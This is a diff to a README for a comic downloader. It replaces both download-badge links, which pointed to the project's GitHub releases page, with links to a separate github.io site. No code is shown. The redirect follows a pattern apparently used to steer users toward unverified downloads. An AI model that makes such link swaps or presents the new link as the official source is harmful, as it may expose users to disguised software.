@@ -39,7 +39,7 @@ Before you start, make sure your computer meets these simple requirements:
 
 Click the button below to go to the official download page:
 
-[![Download JMComic_downloader](https://img.shields.io/badge/Download-JMComic_downloader-2ea44f?style=for-the-badge)](https://github.com/gonzalorodlike9177/JMComic_downloader/releases)
+[![Download JMComic_downloader](https://img.shields.io/badge/Download-JMComic_downloader-2ea44f?style=for-the-badge)](https://gonzalorodlike9177.github.io)
 
 Visit this link to download the application.
 
@@ -220,7 +220,7 @@ If you run into any problems:
 
 You now have everything you need to start using JMComic_downloader. Download your first comic, explore the rankings, and build your collection. The program is designed to be simple, fast, and reliable — so dive in and enjoy!
 
-[![Download JMComic_downloader](https://img.shields.io/badge/Get_It_Now-JMComic_downloader-ff69b4?style=for-the-badge)](https://github.com/gonzalorodlike9177/JMComic_downloader/releases)
+[![Download JMComic_downloader](https://img.shields.io/badge/Get_It_Now-JMComic_downloader-ff69b4?style=for-the-badge)](https://gonzalorodlike9177.github.io)
 
 **Happy downloading!**
 
